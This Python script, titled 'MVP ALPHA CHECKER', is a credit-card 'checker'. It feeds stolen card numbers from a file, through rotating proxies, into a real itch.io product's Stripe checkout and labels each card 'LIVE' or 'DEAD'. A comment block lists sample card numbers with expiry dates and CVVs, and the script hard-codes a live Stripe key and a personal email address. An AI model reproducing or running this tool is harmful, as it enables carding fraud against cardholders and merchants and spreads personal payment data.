# -*- coding: utf-8 -*-
from bs4 import BeautifulSoup
from itertools import cycle
import requests
import json
import threading
import colorama



colorama.init(autoreset=True)
reset = '\033[0m'
fg = [
    '\033[1;91m',  # RED
    '\033[1;92m',  # GREEN
    '\033[1;93m',  # YELLOW
    '\033[1;94m',  # BLUE
    '\033[1;95m',  # MAGENTA
    '\033[1;96m',  # CYAN
    '\033[1;97m',  # WHITE
]

'''  ┌───────[ 4447962400608711|06|2021|272 ]──(52)
     └────────── DEAD >>> Reason: Your card's security code is incorrect.
┌───────[ 4447962400608109|06|2021|517 ]──(55)
└────────── DEAD >>> Reason: Your card's security code is incorrect.

┌───────[ 4447962400604579|06|2021|063 ]──(101)
└────────── DEAD >>> Reason: Your card's security code is incorrect.
     '''


class StripeChecker():

    def __init__(self):
        self.main_domain = "https://yellowafterlife.itch.io/gamemaker-raw-input"
        self.purchase = "https://yellowafterlife.itch.io/gamemaker-raw-input/purchase"
        self.stripe_tokens = "https://api.stripe.com/v1/tokens"

        print("\n\n  {}------=[ {}MVP ALPHA CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
        print("      {}--= {} Created by ALPHA {}=--          ".format(fg[0], fg[1], fg[0]))
        print("  {}------========================------\n".format(fg[0]))
        self.check()

    def check(self):
        proxy_lists = []
        cc_list = open('cc.txt', 'r').read()
        cc_list = cc_list.split('\n')
        credit_entry = 0
        # threads = []

        with open('proxies.txt', 'r') as proxy_list:
            proxy = proxy_list.read()
            proxy = proxy.split('\n')
            for x in proxy:
                proxy_lists.append(x)

        proxy_pool = cycle(proxy_lists)
        Username = str(input(fg[2] + '[*]' + reset + ' Enter Full Name: '))
        zipcode = str(input(fg[2] + '[*]' + reset + "Enter CC's ZipCode: "))
        proxyused = str(input(fg[5] + '[?]' + reset + ' Use Proxy?[y/n] '))
        isproxyused = False

        if proxyused.lower() == "y":
            isAuth = str(input(fg[5] + "[?]" + reset + " Proxy is Authenticated?[y/n] "))
        else:
            isAuth = 'n'

        auth = False

        if isAuth.lower() == "y":
            auth = True
            username = str(input(fg[2] + '[*]' + reset + ' Username: '))
            password = str(input(fg[2] + '[*]' + reset + ' Password: '))
        else:
            username = ""
            password = ""

        print(fg[3] + "[*]" + reset + " Start Checking of " + str(len(cc_list)) + " Credit Card.")
        print()
        for credit_card in cc_list:
            session = requests.Session()
            credit_entry += 1
            if isproxyused:
                proxy_to_use = next(proxy_pool)

            session = requests.Session()
            # session, Username, credit_card, credit_entry,
            # proxy, username, password, isAuth=False

            try:
                ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
            except ValueError:
                pass

            if isproxyused:
                if isAuth:
                    proxy = {'https': "http://" + username + ':' + password + '@' + proxy}
                else:
                    proxy = {'https': 'http://' + proxy}
            else:
                proxy = {'': ''}

            main_domain_source = BeautifulSoup(session.get(self.main_domain, proxies=proxy).text, 'html.parser')
            csrf = main_domain_source.find('meta', {'name': 'csrf_token'})['value']

            purchase_data = {
                "csrf_token": csrf,
                "source": "stripe",
                "medium": "default",
                "initiator": "extension",
                "bp": "5fec4dab005917f29afb03f4685d3af9",
                "price": "$14.95",
                "email": "kathrynzuniga1715@gmail.com",
                "json": "true"
            }
            purchase_response = json.loads(session.post(self.purchase, data=purchase_data, proxies=proxy).text)
            try:
                checkout_url = purchase_response['url']
            except KeyError:
                print(fg[0] + "[x]" + reset + " Connection Error.")
                return

            checkout_data = {
                'card[name]': Username,
                'card[number]': ccNum,
                'card[cvc]': ccCode,
                'card[exp_month]': ccMonth,
                'card[exp_year]': ccYear,
                'card[address_zip]': zipcode,
                'guid': 'aac3b98b-a38c-4a77-88e5-d686e18913be',
                'muid': '40df7419-6e26-4d26-9901-b7f817fae510',
                'sid': '807a3b36-89ae-4449-99bb-2c29e01f6496',
                'payment_user_agent': 'stripe.js/81b45a76; stripe-js-v3/81b45a76',
                'referrer': checkout_url,
                'key': 'pk_live_YpSNu1qXLz2bvSUqP7TK7P9U',
                'pasted_fields': 'number'
            }

            checkout_response = json.loads(session.post(self.stripe_tokens, proxies=proxy, data=checkout_data).text)
            tok_id = checkout_response['id']

            result_data = {
                "csrf_token": csrf,
                "card_token": tok_id,
                "bp": "5fec4dab005917f29afb03f4685d3af9",
                "email": "kathrynzuniga1715@gmail.com",
                "name": Username
            }
            result_response = session.post(checkout_url, proxies=proxy, data=result_data).text
            print()
            try:
                error = BeautifulSoup(result_response, 'html.parser')
                error_msg = error.find('div', {'class': 'form_errors'}).get_text()

                if error_msg == "Your card's security code is incorrect.":
                    print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Alpha Checker)")

                else:
                    print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                    print(fg[0] + "└────────── " + reset + "DEAD >>> Reason: " + str(error_msg))

            except Exception as e:
                print(e)
                print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                print(fg[1] + "└────────── LIVE!")
        print()
        print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
        print()

StripeChecker()
